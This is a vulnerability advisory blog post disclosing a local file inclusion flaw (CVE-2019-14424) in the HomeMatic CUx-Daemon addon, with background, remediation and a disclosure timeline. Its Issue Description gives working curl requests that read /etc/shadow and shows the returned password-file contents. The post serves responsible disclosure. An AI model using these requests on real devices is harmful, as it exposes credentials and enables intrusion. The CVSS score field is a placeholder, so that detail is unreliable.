---
layout: post
title: "Local File Inclusion in HomeMatic CUx-Daemon"
date: 2019-07-15 09:00:00
image:
      url: /assets/pixabay/matrix-1799659_1920.jpg
author: 'Joshua Lehr'
author_image: "https://avatars1.githubusercontent.com/u/22133182?s=400&u=9c37c0c25738af0b47f4b2ab1c3adb0b26f80abf&v=4"
author_link: "https://github.com/noskill1337"
cve: "CVE-2019-14424"
cve_description: "A Local File Inclusion (LFI) issue in the addon CUx-Daemon Version 1.11a of the HomeMatic CCU-Firmware 2.35.16 until 2.45.6 allows remote authenticated attackers to read sensitive files via a simple HTTP Request."
cve_affectedVersion: "CUx-Daemon Version 1.11a until 2.2.0"
cvss: "XX.XX"
softwarePatchLink: "[https://www.homematic-inside.de/blog/cuxd-in-der-version-2-3-0-erschienen?highlight=cuxd](https://www.homematic-inside.de/blog/cuxd-in-der-version-2-3-0-erschienen?highlight=cuxd)"
---

## Overview

- Vulnerability: Local File Inclusion (LFI)
- Vendor: Uwe Langhammer (Alex Krypthul)
- Vendor Homepage: [https://www.homematic-inside.de/software/cuxd](https://www.homematic-inside.de/software/cuxd)
- Product: HomeMatic Addon CUx-Daemon
- Testet on: CCU-Firmware 2.35.16 until 2.45.6 CUx-Daemon Version 1.5a
- Version: {{ page.cve_affectedVersion }}

## Background

HomeMatic is a home automation system consisting of various components for automating several parts of a building, including different sensors and actuators. The HomeMatic CCU2 is a central control unit, which is responsible for integrating these components with each other.

From the HomeMatic's [website](https://www.eq-3.com/products/homematic/control-units-and-gateways.html):
"Homematic devices can be connected to one another and programmed via the control units and gateways. The Homematic Central Control Unit CCU2 is responsible for numerous control, signalling and supervision functions across all areas of the Homematic system. The device includes a browser based user interface to the up the system. It can be controlled in the local network as well as via Internet. The Homematic software offers various configuration and application possibilities, so that there are no limits to creativity for installing your individual smart home..."

Link to the vulnerable [addon](https://www.homematic-inside.de/software/cuxd): This addon is compartible with CCU1, CCU2, CCU3 and RaspberryMatic. The issue can found on this systems as well.

## Issue Description

While analyzing the implementation of the home automation system HomeMatic, one Local File Inclusion (LFI) vulnerability has been identified, which can be exploited in order to display sensitive information. The vulnerability is in the default CUx daemon addon of CCU firmware 2.35.16 to 2.45.6.

![Affected Version](/assets/CVE-2019-14424/CVE-2019-14424.HomeMatic.Version.JPG)

This vulnerability can be exploited by authenticated attackers with access to the web interface to display secret files for future attacks against this system.

The following **bash commands** illustrates this approach:

~~~ bash
curl -k http://192.168.0.125/addons/cuxd/index.ccc\?file\=/etc/shadow
curl -i -s -k  -X $'GET' \
    -H $'Host: 192.168.0.125' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://192.168.0.125/addons/cuxd/index.ccc/?m=24' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' \
    $'http://192.168.0.125/addons/cuxd/index.ccc/?filter=&m=24&lines=25&logfile=/etc/shadow'
~~~

Output of the first **bash command** command:

~~~ bash
root:zCQOnlsoVSv5.:19087:0:99999:7:::
bin:*:10933:0:99999:7:::
daemon:*:10933:0:99999:7:::
adm:*:10933:0:99999:7:::
lp:*:10933:0:99999:7:::
sync:*:10933:0:99999:7:::
shutdown:*:10933:0:99999:7:::
halt:*:10933:0:99999:7:::
uucp:*:10933:0:99999:7:::
operator:*:10933:0:99999:7:::
ftp:*:10933:0:99999:7:::
nobody:*:10933:0:99999:7:::
default:*:10933:0:99999:7:::
~~~

Website call in brwoser with **Local File Inclusion command**:
![POC execute systemcall and read /etc/shadow file](/assets/CVE-2019-14424/CVE-2019-14424.HomeMatic.POC.JPG)

## Impact

This vulnerability affects the confidentiality of secret system files. This allows an attacker to read any system data. If an attacker is aware of the security issue, he or she may steal important data to compromise the system in the next step.

## Remediation

In order to avoid this vulnerability, it's suggested to disable the addon:
**{{ page.cve_affectedVersion }}**

{%if page.softwarePatchLink %}{{ site.softwarePatchText }}{{ page.softwarePatchLink }}{% else %}{{ "" }}{% endif %}

## CVE

- CVE: [{{ page.cve }}](https://cve.mitre.org/cgi-bin/cvename.cgi?name={{ page.cve }})
- CVSS Base Score: **{{ page.cvss }}**
- CVSS: 3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

## Credit

- {{ site.owner }}

## Disclosure Timeline

- 2019-June-15: Discovered vulnerability
- 2019-June-16: Vendor Notification
- 2019-June-21: Vendor Fix/Patch
- 2019-Juli-15: Public Disclosure

## Disclaimer

The information provided is released "as is" without warranty of any kind. The publisher disclaims all warranties, either express or implied, including all warranties of merchantability. No responsibility is taken for the correctness of this information. In no event shall the publisher be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if the publisher has been advised of the possibility of such damages.

System administrators need tools like this to discover vulnerable hosts. This tool is offered for legal purposes only and to forward the security community's understanding of this vulnerability. As this PoC actively exploits the vulnerability, do not use against targets without prior permission.

The contents of this advisory are copyright (c) 2019 {{ site.owner }} and may be distributed freely provided that no fee is charged for this distribution and proper credit is given.

## License

{{ site.LicenseDisplay }}